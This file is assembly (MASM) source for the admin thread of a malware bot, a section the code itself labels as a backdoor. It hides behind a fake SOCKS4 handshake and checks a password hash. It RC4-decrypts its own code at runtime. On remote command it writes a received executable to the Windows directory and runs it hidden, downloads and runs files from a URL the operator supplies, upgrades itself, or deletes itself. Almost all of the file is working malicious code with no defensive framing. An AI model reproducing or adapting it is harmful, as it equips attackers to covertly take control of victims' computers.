; Admin thread
; #########################################################################

.data
        dbCryptSeed     db      2, 3, 4, 5, 6, 7, 8
        IsEncrypted     db      1

.data?
        rc4s            rc4_state <>

.code

; Get password hash
EncryptPass proc uses ebx lpPass: DWORD
        invoke  lstrlen, lpPass
        invoke  CRC32Update, eax, lpPass, eax
        mov     ebx, 50
@l:
        invoke  CRC32Update, eax, offset dbCryptSeed, 7
        xor     eax, ebx
        dec     ebx
        jns     @l
        ret
EncryptPass endp

; Backdoor
AdminHandler proc uses esi edi ebx s, stream: DWORD
        LOCAL   rbuf[128]: BYTE
        LOCAL   bWork: BYTE
        LOCAL   lpBuf[201]: BYTE
        LOCAL   lpRandomID[8]: BYTE
        LOCAL   dwNewPort, dwWritten, hFile: DWORD
        LOCAL   lpURLBuf: DWORD
        LOCAL   fLen: DWORD
        LOCAL   pBuf: DWORD
        LOCAL   fake[62]: BYTE

        invoke  WaitForSingleObject, mootex, INFINITE

        mov     pBuf, 0
        mov     lpBuf[200], 0
        mov     bWork, 0
        invoke  ZeroMemory, addr lpRandomID, 8

        invoke  GlobalAlloc, GPTR, 2048
        mov     lpURLBuf, eax

        ; Receive work byte
        invoke  StreamClear, stream
        invoke  NetRecvUntilBytes, s, stream, 1, 5, 0
        test    eax, eax
        jz      @aerr_close

        invoke  StreamGotoBegin, stream
        coinvoke stream, IStream, Read, addr bWork, 1, NULL
        invoke  StreamClear, stream

        .IF     !((bWork > 0) && (bWork < 11))
                jmp     @aerr_close
        .ENDIF

        ; Receive password
        invoke  NetRecvUntilChar, s, stream, 200, 0, 5
        test    eax, eax
        jz      @aerr_close

        invoke  StreamGotoBegin, stream
        coinvoke stream, IStream, Read, addr lpBuf, 200, NULL
        invoke  StreamClear, stream

        ; Check password
        invoke  EncryptPass, addr lpBuf
        .IF     eax != Password
                jmp     @aerr_close
        .ENDIF

        .IF     IsEncrypted
                invoke  lstrlen, addr lpBuf
                invoke  RC4Setup, addr rc4s, addr lpBuf, eax
                mov     eax, offset @encr_start
                mov     ecx, (offset @encr_end) - (offset @encr_start)
                invoke  RC4Crypt, addr rc4s, eax, ecx
                mov     IsEncrypted, 0
        .ENDIF

        jmp     @F

@encr_start:
                        dw      "++", "++"
        ExeName         db      "\upldf",0
        ExeUpdParam     db      " -upd",0

@@:
        nop
        nop
        nop
        ; Send Ident reponse
        cld
        lea     edi, lpBuf
        mov     eax, Ver
        stosd
        mov     eax, BasePort
        stosd
        invoke  send, s, addr lpBuf, 8, 0

        .IF     (bWork == 2) || (bWork == 3)
                ; Run/Upgrade
                invoke  NetRecvUntilBytes, s, stream, 4, 4, 0
                test    eax, eax
                jz      @aerr_close

                nop
                ; Receive data length
                invoke  StreamGotoBegin, stream
                coinvoke stream, IStream, Read, addr dwNewPort, 4, NULL
                invoke  StreamClear, stream

                ; Receive data
                invoke  NetRecvUntilBytes, s, stream, dwNewPort, 4, 0
                test    eax, eax
                jz      @aerr_close

                invoke  StreamGotoBegin, stream
                invoke  GetWindowsDirectory, addr lpBuf, MAX_PATH

                ; Make filename unique to avoid file access errors
                invoke  GetRandomID, addr lpRandomID, 5
                invoke  lstrcat, addr lpBuf, offset ExeName
                invoke  lstrcat, addr lpBuf, addr lpRandomID
                invoke  lstrcat, addr lpBuf, offset szExeExe

                invoke  CreateFile, addr lpBuf, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0
                mov     hFile, eax
                inc     eax
                jz      @aerr_close

                ; Write data to a file
                mov     fLen, 0
        @write_loop:
                coinvoke stream, IStream, Read, addr rbuf, 128, addr dwWritten
                cmp     dwWritten, 0
                jz      @F
                invoke  WriteFile, hFile, addr rbuf, dwWritten, addr dwWritten, NULL
                mov     eax, dwWritten
                add     fLen, eax
                jmp     @write_loop
        @@:
                nop
                invoke  CloseHandle, hFile
                .IF     bWork == 3
                        ; Upgrade: add -upd argument
                        invoke  lstrcat, addr lpBuf, offset ExeUpdParam
                .ENDIF

                ; Check if entire buffer was written to a file
                mov     eax, dwNewPort
                .IF     eax == fLen
                        ; Execute file
                        invoke  WinExec, addr lpBuf, SW_HIDE
                .ENDIF
                db      20 dup(90h)
        .ELSEIF (bWork == 4)
                ; Remove bot
                invoke  DoSelfDelete
        .ELSEIF (bWork == 8) || (bWork == 10)
                ; Load file from Web & run
                nop
                ; Recv url
                invoke  NetRecvUntilChar, s, stream, 1000, 0, 5
                test    eax, eax
                jz      @aerr_close

                invoke  GetWindowsDirectory, addr lpBuf, MAX_PATH

                ; Make filename unique to avoid file access errors
                invoke  GetRandomID, addr lpRandomID, 5
                invoke  lstrcat, addr lpBuf, offset ExeName
                invoke  lstrcat, addr lpBuf, addr lpRandomID
                invoke  lstrcat, addr lpBuf, offset szExeExe
                
                ; Read url into lpURLBuf
                invoke  StreamGotoBegin, stream
                coinvoke stream, IStream, Read, lpURLBuf, 1000, NULL

                ; Download file from Web
                invoke  URLDownloadToFile, NULL, lpURLBuf, addr lpBuf, NULL, NULL
                .IF     eax == S_OK
                        ; Execute it
                        .IF     (bWork == 8)
                                invoke  ShellExecute, 0, offset szTextOpen, addr lpBuf, NULL, NULL, SW_HIDE
                        .ELSE
                                invoke  ShellExecute, 0, offset szTextOpen, addr lpBuf, offset ExeUpdParam, NULL, SW_HIDE
                        .ENDIF
                .ENDIF
        .ENDIF
        nop
        nop
        jmp     @F
@encr_end:
        dw      "++", "++"
@@:

@aerr_close:
        invoke  closesocket, s
        invoke  GlobalFree, lpURLBuf
        .IF     pBuf
                invoke  GlobalFree, pBuf
        .ENDIF
        invoke  ReleaseMutex, mootex

        xor     eax, eax
        ret
AdminHandler endp

SOCKS4_HEAD struct
        VN      BYTE    ? ; Version
        CD      BYTE    ? ; Command
        DSTPORT WORD    ? ; Port
        DSTIP   DWORD   ? ; Ip
SOCKS4_HEAD ends

AdminThread proc uses esi edi ebx s: DWORD
        LOCAL   stream: DWORD
        LOCAL   ident: SOCKS4_HEAD
        LOCAL   wPort: WORD

        inc     CurConnections

        invoke  StreamCreate, addr stream

        ; Receive socks version & command
        invoke  NetRecvUntilBytes, s, stream, sizeof SOCKS4_HEAD, 5, 1

        invoke  StreamGotoBegin, stream
        invoke  ZeroMemory, addr ident, sizeof SOCKS4_HEAD
        coinvoke stream, IStream, Read, addr ident, sizeof SOCKS4_HEAD, NULL

        lea     esi, ident
        assume  esi: ptr SOCKS4_HEAD
        .IF     ([esi].VN == 'C') && ([esi].CD == 0ffh) && ([esi].DSTPORT == 0ffffh)
                ; Admin
                ; -------------------------
                invoke  AdminHandler, s, stream
        .ELSE
                jmp     @st_s_close_err
        .ENDIF
        jmp     @st_err

@st_s_close_err:
        invoke  closesocket, s

@st_err:
        invoke  StreamFree, stream

        dec     CurConnections
        xor     eax, eax
        ret
AdminThread endp
